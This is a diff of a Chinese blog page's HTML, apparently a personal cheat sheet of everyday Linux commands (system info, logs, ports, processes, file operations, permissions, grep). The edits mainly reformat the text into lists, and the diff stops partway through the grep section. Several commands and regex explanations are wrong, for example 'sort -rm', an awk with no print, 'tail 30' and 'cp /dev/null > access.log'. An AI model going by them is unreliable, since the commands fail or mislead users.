@@ -8,15 +8,15 @@
 <meta name="theme-color" content="#317EFB" />
 <meta content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=0" name="viewport">
 <meta name="keywords" content="">
-<meta name="description" content="1.系统信息查看查看处理器架构 arch、uname -m、lscpu查看内核的版本  cat &#x2F;proc&#x2F;version、uname -r查看系统版本信息 cat &#x2F;etc&#x2F;redhat-release（只适合Redhat系）、lsb_release -a、cat &#x2F;etc&#x2F;issue查看设备重启记录、用户登录记录 last -f wt">
+<meta name="description" content="1.系统信息查看 查看处理器架构  arch、uname -m、lscpu  查看内核的版本   cat &#x2F;proc&#x2F;version、uname -r  查看系统版本信息  cat &#x2F;etc&#x2F;redhat-release（只适合Redhat系）、lsb_release -a、cat &#x2F;etc&#x2F;issue  查看设备重启记录、用户登录记录">
 <meta property="og:type" content="article">
 <meta property="og:title" content="一根儿狗">
 <meta property="og:url" content="https://www.leagsoft.top/2022/07/31/Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/index.html">
 <meta property="og:site_name" content="一根儿狗">
-<meta property="og:description" content="1.系统信息查看查看处理器架构 arch、uname -m、lscpu查看内核的版本  cat &#x2F;proc&#x2F;version、uname -r查看系统版本信息 cat &#x2F;etc&#x2F;redhat-release（只适合Redhat系）、lsb_release -a、cat &#x2F;etc&#x2F;issue查看设备重启记录、用户登录记录 last -f wt">
+<meta property="og:description" content="1.系统信息查看 查看处理器架构  arch、uname -m、lscpu  查看内核的版本   cat &#x2F;proc&#x2F;version、uname -r  查看系统版本信息  cat &#x2F;etc&#x2F;redhat-release（只适合Redhat系）、lsb_release -a、cat &#x2F;etc&#x2F;issue  查看设备重启记录、用户登录记录">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2022-07-31T03:33:03.066Z">
-<meta property="article:modified_time" content="2022-07-31T08:59:08.390Z">
+<meta property="article:modified_time" content="2022-07-31T09:49:36.297Z">
 <meta property="article:author" content="WYK">
 <meta name="twitter:card" content="summary">
 
@@ -326,7 +326,7 @@
         <!-- action button -->
         <div class="text-center">
             <a href="mailto:255361619@qq.com" class="trm-btn">
-                联系我
+                Contact Me
                 <i class="far fa-envelope"></i>
             </a>
         </div>
@@ -360,7 +360,65 @@
                     </div>
 
                     <article class="trm-card trm-publication">
-                        <h1 id="1-系统信息查看"><a href="#1-系统信息查看" class="headerlink" title="1.系统信息查看"></a>1.<strong>系统信息查看</strong></h1><p>查看处理器架构 arch、uname -m、lscpu<br>查看内核的版本  cat &#x2F;proc&#x2F;version、uname -r<br>查看系统版本信息 cat &#x2F;etc&#x2F;redhat-release（只适合Redhat系）、lsb_release -a、cat &#x2F;etc&#x2F;issue<br>查看设备重启记录、用户登录记录 last -f wtmp<br>查看CPU 信息 cat &#x2F;proc&#x2F;cpuinfo、lscpu<br>查看CPU 型号 cat &#x2F;proc&#x2F;cpuinfo |grep name |cut -f2 -d : |uniq -c<br>查看占用cpu资源最多的10个进程 ps aux | head -1;ps aux | sort -rm -k +4 | head<br>查看内存信息 free -m、cat &#x2F;proc&#x2F;meminfo<br>查看占用内存高的三十个进程  ps aux ｜awk ‘{$6&#x2F;1024 “MB\t\t” $11}’ | sort -n | tail 30<br>查看硬盘和分区信息 lsblk、fdisk -l<br>查看10秒内每秒的磁盘占用 iostat(需安装) -x 1 10<br>查看网卡信息 lspci | grep -i ethernet<br>查看显卡信息 lspci | grep -i vga<br>罗列 PCI 设备 lspci -tv<br>查看 USB 设备 lsusb -tv（需安装usbutils）<br>查看系统日期 date<br>查看哪些swap被使用 cat &#x2F;proc&#x2F;swaps<br>查看网络适配器及统计 cat &#x2F;proc&#x2F;net&#x2F;dev<br>查看已加载的文件系统 cat &#x2F;proc&#x2F;mounts </p>
+                        <h1 id="1-系统信息查看"><a href="#1-系统信息查看" class="headerlink" title="1.系统信息查看"></a>1.<strong>系统信息查看</strong></h1><ul>
+<li><p>查看处理器架构 </p>
+<p>arch、uname -m、lscpu</p>
+</li>
+<li><p>查看内核的版本  </p>
+<p>cat &#x2F;proc&#x2F;version、uname -r</p>
+</li>
+<li><p>查看系统版本信息</p>
+<p> cat &#x2F;etc&#x2F;redhat-release（只适合Redhat系）、lsb_release -a、cat &#x2F;etc&#x2F;issue</p>
+</li>
+<li><p>查看设备重启记录、用户登录记录 </p>
+<p>last -f wtmp</p>
+</li>
+<li><p>查看CPU 信息 </p>
+<p>cat &#x2F;proc&#x2F;cpuinfo、lscpu</p>
+</li>
+<li><p>查看CPU 型号 </p>
+<p>cat &#x2F;proc&#x2F;cpuinfo |grep name |cut -f2 -d : |uniq -c</p>
+</li>
+<li><p>查看占用cpu资源最多的10个进程 </p>
+<p>ps aux | head -1;ps aux | sort -rm -k +4 | head</p>
+</li>
+<li><p>查看内存信息 </p>
+<p>free -m、cat &#x2F;proc&#x2F;meminfo</p>
+</li>
+<li><p>查看占用内存高的三十个进程  </p>
+<p>ps aux ｜awk ‘{$6&#x2F;1024 “MB\t\t” $11}’ | sort -n | tail 30</p>
+</li>
+<li><p>查看硬盘和分区信息 </p>
+<p>lsblk、fdisk -l</p>
+</li>
+<li><p>查看10秒内每秒的磁盘占用 </p>
+<p>iostat(需安装) -x 1 10</p>
+</li>
+<li><p>查看网卡信息 </p>
+<p>lspci | grep -i ethernet</p>
+</li>
+<li><p>查看显卡信息 </p>
+<p>lspci | grep -i vga</p>
+</li>
+<li><p>罗列 PCI 设备 </p>
+<p>lspci -tv</p>
+</li>
+<li><p>查看 USB 设备 </p>
+<p>lsusb -tv（需安装usbutils）</p>
+</li>
+<li><p>查看系统日期 </p>
+<p>date </p>
+</li>
+<li><p>查看哪些swap被使用 </p>
+<p>cat &#x2F;proc&#x2F;swaps</p>
+</li>
+<li><p>查看网络适配器及统计 </p>
+<p>cat &#x2F;proc&#x2F;net&#x2F;dev</p>
+</li>
+<li><p>查看已加载的文件系统</p>
+<p> cat &#x2F;proc&#x2F;mounts</p>
+</li>
+</ul>
 <h1 id="2-关机、重启及登出"><a href="#2-关机、重启及登出" class="headerlink" title="2.关机、重启及登出"></a>2.<strong>关机、重启及登出</strong></h1><ul>
 <li>关机 shutdown -h now、init 0 、telinit 0 </li>
 <li>重启 shutdown -r now、reboot</li>
@@ -368,104 +426,415 @@
 <li>取消按预定时间关机 shutdown -c</li>
 <li>注销 logout</li>
 </ul>
-<h1 id="3-系统日志"><a href="#3-系统日志" class="headerlink" title="3.系统日志"></a><strong>3.系统日志</strong></h1><p><strong>&#x2F;var&#x2F;log&#x2F;messages</strong><br>主要存放系统日志。记录linux内核消息及各种应用程序的公共日志信息，包括启动、IO错误、网络错误、程序故障等。对于未使用独立日志文件的应用程序或服务，一般都可以从该文件获得相关的事件记录信息。</p>
-<p><strong>&#x2F;var&#x2F;log&#x2F;cron</strong><br>crond计划任务，和crontab不可分割，crontab是执行命令<br>记录crond计划任务产生的事件信息</p>
-<p><strong>&#x2F;var&#x2F;log&#x2F;secure</strong><br>记录验证与授权信息，例如sshd会将所有信息记录在此</p>
-<p><strong>&#x2F;var&#x2F;log&#x2F;lastlog</strong><br>记录系统中所有用户最后一次登录的日志，此文件是二进制文件，不能直接cat、vi查看，需要使用lastlog命令查看</p>
-<p><strong>&#x2F;var&#x2F;log&#x2F;utmp</strong><br>记录当前登录的每个用户的详细信息，此文件是二进制信息，不能直接cat、vi，需要使用w，who命令查看</p>
-<p><strong>&#x2F;var&#x2F;log&#x2F;wtmp</strong><br>永久记录所有用户的登录、注销信息，同时记录系统的启动、重启、关机事件。此文件是二进制文件，不能直接cat、vi查看，需要使用last命令查看（last -f 指定文件路径）</p>
+<h1 id="3-系统日志"><a href="#3-系统日志" class="headerlink" title="3.系统日志"></a><strong>3.系统日志</strong></h1><ul>
+<li><p><strong>&#x2F;var&#x2F;log&#x2F;messages</strong><br>主要存放系统日志。记录linux内核消息及各种应用程序的公共日志信息，包括启动、IO错误、网络错误、程序故障等。对于未使用独立日志文件的应用程序或服务，一般都可以从该文件获得相关的事件记录信息。</p>
+</li>
+<li><p><strong>&#x2F;var&#x2F;log&#x2F;cron</strong><br>crond计划任务，和crontab不可分割，crontab是执行命令<br>记录crond计划任务产生的事件信息</p>
+</li>
+<li><p><strong>&#x2F;var&#x2F;log&#x2F;secure</strong><br>记录验证与授权信息，例如sshd会将所有信息记录在此</p>
+</li>
+<li><p><strong>&#x2F;var&#x2F;log&#x2F;lastlog</strong><br>记录系统中所有用户最后一次登录的日志，此文件是二进制文件，不能直接cat、vi查看，需要使用lastlog命令查看</p>
+</li>
+<li><p><strong>&#x2F;var&#x2F;log&#x2F;utmp</strong><br>记录当前登录的每个用户的详细信息，此文件是二进制信息，不能直接cat、vi，需要使用w，who命令查看</p>
+</li>
+<li><p><strong>&#x2F;var&#x2F;log&#x2F;wtmp</strong><br>永久记录所有用户的登录、注销信息，同时记录系统的启动、重启、关机事件。此文件是二进制文件，不能直接cat、vi查看，需要使用last命令查看（last -f 指定文件路径）</p>
+</li>
+</ul>
 <h1 id="4-端口查看"><a href="#4-端口查看" class="headerlink" title="4.端口查看"></a><strong>4.端口查看</strong></h1><h2 id="4-1-netstat"><a href="#4-1-netstat" class="headerlink" title="4.1 netstat"></a>4.1 netstat</h2><p>-a     –列出所有端口<br>-at   –列出所有tcp端口<br>-au  –列出所有udp端口<br>-l     –列出处于监听状态的端口<br>-lt    –所有监听状态的tcp端口<br>       –udp同理同上<br>-s    –显示网络统计信息<br>-st   –tcp<br>-su  –udp<br>-p    –显示PID和进程名称<br>-n   –不显示主机、端口和用户名，用数字代替<br>-i      –显示网络接口列表<br>-ie   –显示详细信息，像ifconfig<br>-r     –显示路由表</p>
 <h2 id="4-2-ss"><a href="#4-2-ss" class="headerlink" title="4.2 ss"></a>4.2 ss</h2><p>比netstat更快</p>
 <p>-h –help 帮助<br>-V –version  显示版本号<br>-t –tcp 显示 TCP 协议的 sockets<br>-u –udp 显示 UDP 协议的 sockets<br>-x –unix 显示 unix domain sockets，与 -f 选项相同<br>-n –numeric 不解析服务的名称，如 “22” 端口不会显示成 “ssh”<br>-l –listening 只显示处于监听状态的端口<br>-p –processes 显示监听端口的进程(Ubuntu 上需要 sudo)<br>-a –all 对 TCP 协议来说，既包含监听的端口，也包含建立的连接<br>-r –resolve 把 IP 解释为域名，把端口号解释为协议名称</p>
 <h2 id="4-3-lsof"><a href="#4-3-lsof" class="headerlink" title="4.3 lsof"></a>4.3 lsof</h2><p>lsof 常见的用法是查找应用程序打开的文件的名称和数目。</p>
-<p>查看8080端口占用情况  lsof -i :8080<br>显示开启文件abc.txt的进程  lsof  abc.txt<br>显示abc进程现在打开的文件 lsof -c abc<br>列出进程号为1234的进程所打开的文件 lsof -c -p 1234<br>显示归属gid的进程情况  lsof -g gid<br>显示目录下被进程开启的文件  lsof +d &#x2F;usr&#x2F;local&#x2F;</p>
+<ul>
+<li><p>查看8080端口占用情况  </p>
+<p>lsof -i :8080</p>
+</li>
+<li><p>显示开启文件abc.txt的进程  </p>
+<p>lsof  abc.txt</p>
+</li>
+<li><p>显示abc进程现在打开的文件 </p>
+<p>lsof -c abc</p>
+</li>
+<li><p>列出进程号为1234的进程所打开的文件</p>
+<p> lsof -c -p 1234</p>
+</li>
+<li><p>显示归属gid的进程情况  </p>
+<p>lsof -g gid</p>
+</li>
+<li><p>显示目录下被进程开启的文件  </p>
+<p>lsof +d &#x2F;usr&#x2F;local&#x2F;</p>
+</li>
+</ul>
 <h1 id="5-进程查看"><a href="#5-进程查看" class="headerlink" title="5.进程查看"></a>5.进程查看</h1><h2 id="5-1-ps"><a href="#5-1-ps" class="headerlink" title="5.1 ps"></a>5.1 ps</h2><p>a：显示一个终端的所有进程，除会话引线外；<br>u：显示进程的归属用户及内存的使用情况；<br>x：显示没有控制终端的进程；<br>-l：长格式显示更加详细的信息；<br>-e：显示所有进程；<br>-f ：用ASCII字符显示树状结构，表达程序间的相互关系</p>
 <p>常用</p>
-<p>ps -aux | grep root<br>ps aux |  grep root<br>ps -ef  | grep java</p>
+<ul>
+<li>ps -aux | grep root</li>
+<li>ps aux |  grep root </li>
+<li>ps -ef  | grep java</li>
+</ul>
 <h2 id="5-2-pstree"><a href="#5-2-pstree" class="headerlink" title="5.2 pstree"></a>5.2 pstree</h2><p>用ASCII字符显示树状结构，清楚地表达程序间的相互关系。</p>
 <h2 id="5-3-jobs"><a href="#5-3-jobs" class="headerlink" title="5.3 jobs"></a>5.3 jobs</h2><p>jobs查看后台进程<br>命令或脚本  命令行后加 &amp;  表示放到后台运行<br>jobs查看后台运行的进程<br>kill 时进程号前加%<br>正在前台运行的进程  ctrl+Z 进入暂停状态并放入后台<br>bg %进程号     放入后台继续运行<br>fg  %进程号     放入前台继续运行<br>disown  从table中移除一个job<br>-h  不从table中移除job，设置为不接受shell发送的sighub信号<br>-a   如果不指定id，针对所有job删除<br>-r    如果不指定id，只对running状态进行删除</p>
-<h1 id="6-文件和目录操作"><a href="#6-文件和目录操作" class="headerlink" title="6.文件和目录操作"></a><strong>6.文件和目录操作</strong></h1><h2 id="6-1-ls"><a href="#6-1-ls" class="headerlink" title="6.1 ls"></a>6.1 ls</h2><table>
-<thead>
-<tr>
-<th align="center">查看目录中的文件</th>
-<th>ls</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center"></td>
-<td></td>
-</tr>
-<tr>
-<td align="center">显示文件和目录的详细资料</td>
-<td>ls -l</td>
-</tr>
-<tr>
-<td align="center">:———————-:</td>
-<td>—–</td>
-</tr>
-<tr>
-<td align="center"></td>
-<td></td>
-</tr>
-<tr>
-<td align="center">显示隐藏文件</td>
-<td>ls -a</td>
-</tr>
-<tr>
-<td align="center">:————–:</td>
-<td>—–</td>
-</tr>
-<tr>
-<td align="center">查看目录中的文件</td>
-<td>ls</td>
-</tr>
-</tbody></table>
-<p>查看目录中的文件  ls</p>
-<p>显示文件和目录的详细资料  ls -l</p>
-<p>显示隐藏文件  ls -a</p>
-<h2 id="6-2-cd"><a href="#6-2-cd" class="headerlink" title="6.2 cd"></a>6.2 cd</h2><p>进入 ‘&#x2F; home’ 目录 cd &#x2F;home<br>返回上一级目录  cd ..<br>返回上两级目录 cd ..&#x2F;..<br>返回上次所在的目录 cd - </p>
-<h2 id="6-3-pwd"><a href="#6-3-pwd" class="headerlink" title="6.3 pwd"></a>6.3 pwd</h2><p>显示工作路径  pwd </p>
-<h2 id="6-4-mkdir"><a href="#6-4-mkdir" class="headerlink" title="6.4 mkdir"></a>6.4 mkdir</h2><p>创建一个叫做 ‘dir1’ 的目录 mkdir dir1<br>同时创建两个目录  mkdir dir1 dir2<br>创建一个目录树  mkdir -p &#x2F;tmp&#x2F;dir1&#x2F;dir2 </p>
-<h2 id="6-5-rm"><a href="#6-5-rm" class="headerlink" title="6.5 rm"></a>6.5 rm</h2><p>删除一个叫做 ‘file1’ 的文件 rm -f file1<br>删除一个叫做 ‘dir1’ 的目录并同时删除其内容 rm -rf dir1 </p>
-<h2 id="6-6-rmdir"><a href="#6-6-rmdir" class="headerlink" title="6.6 rmdir"></a>6.6 rmdir</h2><p>删除一个叫做 ‘dir1’ 的目录 rmdir dir1 </p>
-<h2 id="6-7-cp"><a href="#6-7-cp" class="headerlink" title="6.7 cp"></a>6.7 cp</h2><p>复制一个文件 cp file1 file2<br>复制dir目录下的所有文件到当前工作目录 cp dir&#x2F;* .<br>复制一个目录到当前工作目录 cp -a &#x2F;tmp&#x2F;dir1 .<br>复制一个目录 cp -a dir1 dir2<br>复制一个目录及子目录 cp -r dir1 dir2 </p>
-<h2 id="6-8-mv"><a href="#6-8-mv" class="headerlink" title="6.8 mv"></a>6.8 mv</h2><p>重命名&#x2F;移动 一个目录 mv dir1 new_dir </p>
-<h2 id="6-9-ln"><a href="#6-9-ln" class="headerlink" title="6.9 ln"></a>6.9 ln</h2><p>创建一个指向文件或目录的软链接  ln -s file1 lnk1<br>创建一个指向文件或目录的物理链接 ln file1 lnk1 </p>
-<h2 id="6-10-scp"><a href="#6-10-scp" class="headerlink" title="6.10 scp"></a>6.10 scp</h2><p>scp<br>scp [可选参数] file_source file_target<br>从本地复制到远程服务器的&#x2F;home&#x2F;目录<br>scp  1.txt <a href="mailto:&#114;&#111;&#111;&#x74;&#64;&#49;&#46;&#x31;&#46;&#x31;&#x2e;&#49;">&#114;&#111;&#111;&#x74;&#64;&#49;&#46;&#x31;&#46;&#x31;&#x2e;&#49;</a>:&#x2F;home&#x2F;<br>从远程复制到本地<br>scp  <a href="mailto:&#x72;&#x6f;&#111;&#116;&#x40;&#49;&#x2e;&#49;&#46;&#x31;&#46;&#x31;">&#x72;&#x6f;&#111;&#116;&#x40;&#49;&#x2e;&#49;&#46;&#x31;&#46;&#x31;</a>:&#x2F;home&#x2F;tmp&#x2F;1.txt &#x2F;home&#x2F;tm</p>
-<h2 id="6-11-diff"><a href="#6-11-diff" class="headerlink" title="6.11 diff"></a>6.11 diff</h2><h2 id="6-12-清空文件"><a href="#6-12-清空文件" class="headerlink" title="6.12 清空文件"></a>6.12 清空文件</h2><dl><dt>true命名<br>true &gt; access.log<br>‘’:’’ 符号，shell的内置命令，等同于true，用来作为no-op（不进行任何操作）</dt><dd>&gt; access.log</dd></dl><p>使用cat、cp、dd命令操作&#x2F;dev&#x2F;null设备<br>cat &#x2F;dev&#x2F;null &gt; access.log<br>cp &#x2F;dev&#x2F;null &gt; access.log<br>dd if&#x3D;&#x2F;dev&#x2F;null of&#x3D;access.log【if代表输入、of代表输出】</p>
-<p>使用echo命令将空字符串重定向到文件<br>echo “ “ &gt; access.log<br>echo &gt; access.log<br>以上将有空白字符<br>echo -n “ “ &gt;  access.log</p>
-<p>truncate<br>将一个文件缩小或者扩展到某个给定的大小<br>文件大小设定为0<br>truncate -s 0 access.log   </p>
+<h1 id="6-文件和目录操作"><a href="#6-文件和目录操作" class="headerlink" title="6.文件和目录操作"></a><strong>6.文件和目录操作</strong></h1><h2 id="6-1-ls"><a href="#6-1-ls" class="headerlink" title="6.1 ls"></a>6.1 ls</h2><ul>
+<li><p>查看目录中的文件  </p>
+<p>ls</p>
+</li>
+<li><p>显示文件和目录的详细资料  </p>
+<p>ls -l</p>
+</li>
+<li><p>显示隐藏文件 </p>
+<p>ls -a</p>
+</li>
+</ul>
+<h2 id="6-2-cd"><a href="#6-2-cd" class="headerlink" title="6.2 cd"></a>6.2 cd</h2><ul>
+<li><p>进入 ‘&#x2F; home’ 目录 </p>
+<p>cd &#x2F;home </p>
+</li>
+<li><p>返回上一级目录  </p>
+<p>cd .. </p>
+</li>
+<li><p>返回上两级目录 </p>
+<p>cd ..&#x2F;.. </p>
+</li>
+<li><p>返回上次所在的目录 </p>
+<p>cd -</p>
+</li>
+</ul>
+<h2 id="6-3-pwd"><a href="#6-3-pwd" class="headerlink" title="6.3 pwd"></a>6.3 pwd</h2><ul>
+<li><p>显示工作路径  </p>
+<p>pwd</p>
+</li>
+</ul>
+<h2 id="6-4-mkdir"><a href="#6-4-mkdir" class="headerlink" title="6.4 mkdir"></a>6.4 mkdir</h2><ul>
+<li><p>创建一个叫做 ‘dir1’ 的目录 </p>
+<p>mkdir dir1</p>
+</li>
+<li><p>同时创建两个目录  </p>
+<p>mkdir dir1 dir2 </p>
+</li>
+<li><p>创建一个目录树  </p>
+<p>mkdir -p &#x2F;tmp&#x2F;dir1&#x2F;dir2</p>
+</li>
+</ul>
+<h2 id="6-5-rm"><a href="#6-5-rm" class="headerlink" title="6.5 rm"></a>6.5 rm</h2><ul>
+<li><p>删除一个叫做 ‘file1’ 的文件 </p>
+<p>rm -f file1 </p>
+</li>
+<li><p>删除一个叫做 ‘dir1’ 的目录并同时删除其内容</p>
+<p> rm -rf dir1</p>
+</li>
+</ul>
+<h2 id="6-6-rmdir"><a href="#6-6-rmdir" class="headerlink" title="6.6 rmdir"></a>6.6 rmdir</h2><ul>
+<li><p>删除一个叫做 ‘dir1’ 的目录 </p>
+<p>rmdir dir1</p>
+</li>
+</ul>
+<h2 id="6-7-cp"><a href="#6-7-cp" class="headerlink" title="6.7 cp"></a>6.7 cp</h2><ul>
+<li><p>复制一个文件 </p>
+<p>cp file1 file2 </p>
+</li>
+<li><p>复制dir目录下的所有文件到当前工作目录 </p>
+<p>cp dir&#x2F;* . </p>
+</li>
+<li><p>复制一个目录到当前工作目录 </p>
+<p>cp -a &#x2F;tmp&#x2F;dir1 . </p>
+</li>
+<li><p>复制一个目录</p>
+<p> cp -a dir1 dir2 </p>
+</li>
+<li><p>复制一个目录及子目录 </p>
+<p>cp -r dir1 dir2</p>
+</li>
+</ul>
+<h2 id="6-8-mv"><a href="#6-8-mv" class="headerlink" title="6.8 mv"></a>6.8 mv</h2><ul>
+<li><p>重命名&#x2F;移动 一个目录 </p>
+<p>mv dir1 new_dir</p>
+</li>
+</ul>
+<h2 id="6-9-ln"><a href="#6-9-ln" class="headerlink" title="6.9 ln"></a>6.9 ln</h2><ul>
+<li><p>创建一个指向文件或目录的软链接  </p>
+<p>ln -s file1 lnk1 </p>
+</li>
+<li><p>创建一个指向文件或目录的物理链接</p>
+<p> ln file1 lnk1</p>
+</li>
+</ul>
+<h2 id="6-10-scp"><a href="#6-10-scp" class="headerlink" title="6.10 scp"></a>6.10 scp</h2><p>scp [可选参数] file_source file_target </p>
+<ul>
+<li><p>从本地复制到远程服务器的&#x2F;home&#x2F;目录</p>
+<p>scp  1.txt <a href="mailto:&#114;&#x6f;&#x6f;&#x74;&#x40;&#49;&#x2e;&#49;&#46;&#49;&#46;&#x31;">&#114;&#x6f;&#x6f;&#x74;&#x40;&#49;&#x2e;&#49;&#46;&#49;&#46;&#x31;</a>:&#x2F;home&#x2F;</p>
+</li>
+<li><p>从远程复制到本地</p>
+<p>scp  <a href="mailto:&#114;&#111;&#111;&#116;&#64;&#x31;&#x2e;&#49;&#x2e;&#49;&#46;&#49;">&#114;&#111;&#111;&#116;&#64;&#x31;&#x2e;&#49;&#x2e;&#49;&#46;&#49;</a>:&#x2F;home&#x2F;tmp&#x2F;1.txt &#x2F;home&#x2F;tmp</p>
+</li>
+</ul>
+<h2 id="6-11-diff"><a href="#6-11-diff" class="headerlink" title="6.11 diff"></a>6.11 diff</h2><h2 id="6-12-清空文件"><a href="#6-12-清空文件" class="headerlink" title="6.12 清空文件"></a>6.12 清空文件</h2><ul>
+<li><p>true命名</p>
+<p>true &gt; access.log</p>
+<p>‘’:’’ 符号，shell的内置命令，等同于true，用来作为no-op（不进行任何操作）</p>
+<p>: &gt; access.log</p>
+</li>
+<li><p>使用cat、cp、dd命令操作&#x2F;dev&#x2F;null设备</p>
+<p>cat &#x2F;dev&#x2F;null &gt; access.log</p>
+<p>cp &#x2F;dev&#x2F;null &gt; access.log</p>
+<p>dd if&#x3D;&#x2F;dev&#x2F;null of&#x3D;access.log【if代表输入、of代表输出】</p>
+</li>
+<li><p>使用echo命令将空字符串重定向到文件</p>
+<p>echo “ “ &gt; access.log</p>
+<p>echo &gt; access.log</p>
+<p>以上将有空白字符</p>
+<p>echo -n “ “ &gt;  access.log</p>
+</li>
+<li><p>truncate</p>
+<p>将一个文件缩小或者扩展到某个给定的大小</p>
+<p>文件大小设定为0</p>
+<p>truncate -s 0 access.log</p>
+</li>
+</ul>
 <h1 id="7-文件权限"><a href="#7-文件权限" class="headerlink" title="7.文件权限"></a>7.文件权限</h1><h2 id="7-1-chmod"><a href="#7-1-chmod" class="headerlink" title="7.1 chmod"></a>7.1 chmod</h2><p>修改用户的权限</p>
 <p>文件基本权限有九个，分别是 <strong>owner&#x2F;group&#x2F;others(拥有者&#x2F;组&#x2F;其他)</strong> 三种身份各有自己的 <strong>read&#x2F;write&#x2F;execute</strong> 权限。</p>
 <p>文件的权限字符为：  <strong>-rwxrwxrwx</strong> </p>
 <ul>
-<li>r:4</li>
-<li>w:2</li>
-<li>x:1</li>
+<li><p>r:4</p>
+</li>
+<li><p>w:2</p>
+</li>
+<li><p>x:1</p>
+</li>
+<li><p>将&#x2F;bin&#x2F;file1文件所有的权限都设定启用</p>
+</li>
 </ul>
-<p>将&#x2F;bin&#x2F;file1文件所有的权限都设定启用</p>
 <p>chmod 777 &#x2F;bin&#x2F;file1</p>
 <h2 id="7-2-chown"><a href="#7-2-chown" class="headerlink" title="7.2 chown"></a>7.2 chown</h2><p>更改用户所属用户与组</p>
-<p>改变一个文件的所有人属性  chown user1 file1<br>改变一个目录的所有人属性并同时改变改目录下所有文件的属性  chown -R user1 directory1<br>改变一个文件的所有人和群组属性  chown user1:group1 file1 </p>
+<ul>
+<li><p>改变一个文件的所有人属性  </p>
+<p>chown user1 file1 </p>
+</li>
+<li><p>改变一个目录的所有人属性并同时改变改目录下所有文件的属性  </p>
+<p>chown -R user1 directory1 </p>
+</li>
+<li><p>改变一个文件的所有人和群组属性  </p>
+<p>chown user1:group1 file1</p>
+</li>
+</ul>
 <h2 id="7-3-chgrp"><a href="#7-3-chgrp" class="headerlink" title="7.3 chgrp"></a>7.3 chgrp</h2><p>更改文件所属组</p>
-<p>chgrp group1 file1 改变文件的群组 </p>
-<h1 id="8-文件特殊属性"><a href="#8-文件特殊属性" class="headerlink" title="8.文件特殊属性"></a>8.文件特殊属性</h1><p>只允许以追加方式读写文件 chattr +a file1<br>在进行文件系统备份时，dump程序将忽略这个文件  chattr +d file1<br>设置成不可变的文件，不能被删除、修改、重命名或者链接 chattr +i file1<br>一旦应用程序对这个文件执行了写操作，使系统立刻把修改的结果写到磁盘  chattr +S file1<br> 若文件被删除，系统会允许你在以后恢复这个被删除的文件 chattr +u file1<br>显示特殊的属性  lsattr </p>
-<h1 id="9-文件搜索"><a href="#9-文件搜索" class="headerlink" title="9.文件搜索"></a>9.文件搜索</h1><h2 id="9-1-grep"><a href="#9-1-grep" class="headerlink" title="9.1 grep"></a>9.1 grep</h2><p>grep -[acinv]  ‘搜索内容串’  filename<br>-a 以文本文件方式搜索<br>-c 计算找到的符合行的次数<br>-i 忽略大小写<br>-n 顺便输出行号<br>-v 反向选择，即显示不包含匹配文本的所有行</p>
-<p>grep正则表达式元字符集（基本集）<br>^ 锚定行的开始  如：’^grep’匹配所有以grep开头的行。<br>$ 锚定行的结束 如：’grep$’匹配所有以grep结尾的行。<br>. 匹配一个非换行符的字符 如：’gr.p’匹配gr后接一个任意字符，然后是p。<br>*匹配零个或多个先前字符 如：’grep’匹配所有一个或多个空格后紧跟grep的行。<br>.*一起用代表任意字符。<br>[] 匹配一个指定范围内的字符，如’[Gg]rep’匹配Grep和grep。<br>[^] 匹配一个不在指定范围内的字符，如：’[^A-FH-Z]rep’匹配不包含A-R和T-Z的一个字母开头，紧跟rep的行。<br>&#x2F;(..&#x2F;) 标记匹配字符，如’&#x2F;(love&#x2F;)’，love被标记为1。<br>&#x2F;&lt; 锚定单词的开始<br>&#x2F;&gt; 锚定单词的结束，如’grep&#x2F;&gt;’匹配包含以grep结尾的单词的行。<br>例：</p>
-<p>grep -c “us” test.txt 统计所有以“us”字符开头的行有多少<br>grep -i “May” test.txt 不区分大小写查找“May”所有的行）<br>grep -n “user” test.txt 显示行号；显示匹配字符“user”的行及行号，相同于 nl test.txt |grep user）<br>grep -v “user” test.txt 显示输出没有字符“user”所有的行）<br>grep “user” test.txt 显示输出字符“user”所在的行）</p>
-<p>搜索有the的行,并输出行号<br>grep -n ‘the’ regular_express.txt<br>搜 索没有the的行,并输出行号<br>grep -nv ‘the’ regular_express.txt</p>
-<h2 id="9-2-find"><a href="#9-2-find" class="headerlink" title="9.2 find"></a>9.2 find</h2><p>从 ‘&#x2F;‘ 开始进入根文件系统搜索文件和目录  find &#x2F; -name file1<br>搜索属于用户 ‘user1’ 的文件和目录  find &#x2F; -user user1<br>在目录 ‘&#x2F; home&#x2F;user1’ 中搜索带有’.bin’ 结尾的文件  find &#x2F;home&#x2F;user1 -name *.bin<br>搜索在过去100天内未被使用过的执行文件 find &#x2F;usr&#x2F;bin -type f -atime +100<br>搜索在10天内被创建或者修改过的文件  find &#x2F;usr&#x2F;bin -type f -mtime -10<br>搜索以 ‘.rpm’ 结尾的文件并定义其权限  find &#x2F; -name *.rpm -exec chmod 755 ‘{}’ ;<br>搜索以 ‘.rpm’ 结尾的文件，忽略光驱、捷盘等可移动设备  find &#x2F; -xdev -name *.rpm<br>whereis halt 显示一个二进制文件、源码或man的位置<br>which halt 显示一个二进制文件或可执行文件的完整路径 </p>
+<ul>
+<li><p>改变文件的群组 </p>
+<p>chgrp group1 file1</p>
+</li>
+</ul>
+<h1 id="8-文件特殊属性"><a href="#8-文件特殊属性" class="headerlink" title="8.文件特殊属性"></a>8.文件特殊属性</h1><ul>
+<li><p>只允许以追加方式读写文件 </p>
+<p>chattr +a file1</p>
+</li>
+<li><p>在进行文件系统备份时，dump程序将忽略这个文件  </p>
+<p>chattr +d file1 </p>
+</li>
+<li><p>设置成不可变的文件，不能被删除、修改、重命名或者链接 </p>
+<p>chattr +i file1 </p>
+</li>
+<li><p>一旦应用程序对这个文件执行了写操作，使系统立刻把修改的结果写到磁盘  </p>
+<p>chattr +S file1 </p>
+</li>
+<li><p>若文件被删除，系统会允许你在以后恢复这个被删除的文件</p>
+</li>
+</ul>
+<p>  chattr +u file1 </p>
+<ul>
+<li><p>显示特殊的属性 </p>
+<p> lsattr</p>
+</li>
+</ul>
+<h1 id="9-文件搜索"><a href="#9-文件搜索" class="headerlink" title="9.文件搜索"></a>9.文件搜索</h1><h2 id="9-1-grep"><a href="#9-1-grep" class="headerlink" title="9.1 grep"></a>9.1 grep</h2><ul>
+<li><p>grep -[acinv]  ‘搜索内容串’  filename</p>
+<p>-a 以文本文件方式搜索</p>
+<p>-c 计算找到的符合行的次数</p>
+<p>-i 忽略大小写</p>
+<p>-n 顺便输出行号</p>
